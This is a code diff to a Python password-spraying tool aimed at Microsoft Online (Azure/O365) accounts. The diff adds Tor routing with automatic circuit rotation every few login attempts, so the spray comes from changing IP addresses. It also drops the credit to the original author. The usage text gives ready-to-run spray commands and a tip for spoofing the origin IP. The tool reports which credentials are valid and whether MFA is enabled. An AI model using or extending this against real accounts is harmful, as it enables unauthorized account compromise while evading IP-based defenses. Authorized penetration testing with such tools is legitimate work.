@@ -6,20 +6,23 @@ import urllib3
 from math import trunc
 from random import randrange, shuffle
 from fake_useragent import UserAgent
+from stem import Signal
+from stem.control import Controller
 
 description = """
-This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
-
 This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
 """
 
 epilog = """
 EXAMPLE USAGE:
 This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
-    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020
+    python3 msolspray-ng.py --userlist ./userlist.txt --password Winter2020
 
 This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
-    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
+    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
+
+This command will create a new tor circuit every 5 login attempts and use it to spray from randomized IP addresses.
+    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword --tor --tor-control-pw H1d3M3 --tor-refresh-interval 5
 
 TIPS:
 [1] When using along with FireProx, pass option -H "X-My-X-Forwarded-For: 127.0.0.1" to spoof origin IP.
@@ -106,6 +109,72 @@ def assertions(args):
     assert args.creds or ((args.username or args.usernames) and (args.password or args.passwords))
     if args.proxy:
         assert "://" in args.proxy, "Malformed proxy. Missing schema?"
+
+
+def get_exit_node_details(control_port, control_pw):
+    """Get the exit node details.
+    Args:
+        control_port (int): Port for the tor control port
+        control_pw (str): Password for the tor control port
+    Returns:
+        dict: Dictionary containing nickname, IP address and fingerprint of the exit node
+    """
+    with Controller.from_port(port=control_port) as controller:
+        controller.authenticate(
+            password=control_pw
+        )
+
+        for circ in controller.get_circuits():
+            if circ.status != "BUILT":
+                continue
+
+            exit_fingerprint = circ.path[-1][0]
+            desc = controller.get_network_status(exit_fingerprint)
+            if desc:
+                return {
+                    "nickname": desc.nickname,
+                    "ip": desc.address,
+                    "fingerprint": desc.fingerprint,
+                }
+        return None
+
+
+def need_refresh_tor(tor, refresh_interval, count):
+    """Check if we need to refresh the tor circuit.
+
+    Args:
+        tor (bool): If tor is enabled
+        refresh_interval (int): Number of login attempts to wait before refreshing the circuit
+        count (int): Current number of login attempts
+
+    Returns:
+        bool: True if we need to refresh the circuit
+    """
+    return tor and count % refresh_interval == 0
+
+
+def refresh_tor_circuit(control_port, control_pw, verbose=False):
+    """Refresh the tor circuit.
+
+    Args:
+        control_port (int): Port for the tor control port
+        control_pw (str): Password for the tor control port
+    """
+    with Controller.from_port(port=control_port) as controller:
+        controller.authenticate(control_pw)
+        controller.signal(Signal.NEWNYM)
+        controller.close()
+        time.sleep(5)  # wait for the new circuit to be established
+        if verbose:
+            exit_node = get_exit_node_details(control_port, control_pw)
+            if exit_node:
+                print(
+                    f"{text_colors.green}New Tor circuit established. Exit node: {exit_node['nickname']} ({exit_node['ip']}) - {exit_node['fingerprint']}{text_colors.reset}"
+                )
+            else:
+                print(
+                    f"{text_colors.red}Failed to get exit node details after refreshing Tor circuit.{text_colors.reset}"
+                )
 
 
 # disable ssl warnings
@@ -270,6 +339,39 @@ parser.add_argument(
     help="Timeout for requests (default: %(default)s)",
 )
 parser.add_argument(
+    "--tor",
+    action="store_true",
+    help="Use tor for requests (overrides --proxy).",
+)
+parser.add_argument(
+    "--tor-port",
+    dest="socks_port",
+    default=9050,
+    type=int,
+    help="Tor socks port to use (default: %(default)s).",
+)
+parser.add_argument(
+    "--tor-control-port",
+    dest="control_port",
+    default=9051,
+    type=int,
+    help="Tor control port to use (default: %(default)s).",
+)
+parser.add_argument(
+    "--tor-control-pw",
+    dest="control_pw",
+    default=None,
+    type=str,
+    help="Password for Tor control port (default: %(default)s).",
+)
+parser.add_argument(
+    "--tor-refresh-interval",
+    dest="refresh_interval",
+    default=10,
+    type=int,
+    help="Interval (in number of login attempts) to refresh Tor circuit (default: %(default)s).",
+)
+parser.add_argument(
     "-v",
     "--verbose",
     action="store_true",
@@ -296,6 +398,11 @@ if args.proxy:
     proxies = {
         "http": args.proxy,
         "https": args.proxy,
+    }
+if args.tor:
+    proxies = {
+        "http": f"socks5://127.0.0.1:{args.socks_port}",
+        "https": f"socks5://127.0.0.1:{args.socks_port}",
     }
 interrupt = False
 url_idx = 0
@@ -581,7 +688,7 @@ if args.creds:
                 if args.notify_actions:
                     notify(
                         args.notify_actions,
-                        "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
+                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for user interaction...",
                     )
                 yes = {"yes", "y"}
                 no = {"no", "n", ""}
@@ -598,18 +705,21 @@ if args.creds:
                     interrupt = True
                     break
 
-                # else: continue even though lockout is detected
+        if need_refresh_tor(args.tor, args.refresh_interval, creds_counter):
+            refresh_tor_circuit(args.control_port, args.control_pw, args.verbose)
 
-        if results != "":
-            with open(args.out, "a") as out_file:
-                out_file.write(results)
-            print(f"Results have been written to {args.out}.")
-            if args.notify:
-                msg = "Found valid credentials! (-.^)\n\n"
-                msg += "\n".join(results_list)
-                notify(args.notify, msg)
-            results = ""
-            results_list.clear()
+            # else: continue even though lockout is detected
+
+    if results != "":
+        with open(args.out, "a") as out_file:
+            out_file.write(results)
+        print(f"Results have been written to {args.out}.")
+        if args.notify:
+            msg = "Found valid credentials! (-.^)\n\n"
+            msg += "\n".join(results_list)
+            notify(args.notify, msg)
+        results = ""
+        results_list.clear()
 
 else:
     for pindex, password in enumerate(passwords):
@@ -852,7 +962,7 @@ else:
                 if args.notify_actions:
                     notify(
                         args.notify_actions,
-                        "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
+                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for user interaction...",
                     )
                 yes = {"yes", "y"}
                 no = {"no", "n", ""}
@@ -868,8 +978,11 @@ else:
                     )
                     interrupt = True
                     break
-
                 # else: continue even though lockout is detected
+
+            if need_refresh_tor(args.tor, args.refresh_interval, username_counter):
+                refresh_tor_circuit(args.control_port, args.control_pw, args.verbose)
+
         # end of user iteration
         # write current users to file
         with open(start_time + "_currentusers.txt", "w") as user_file:
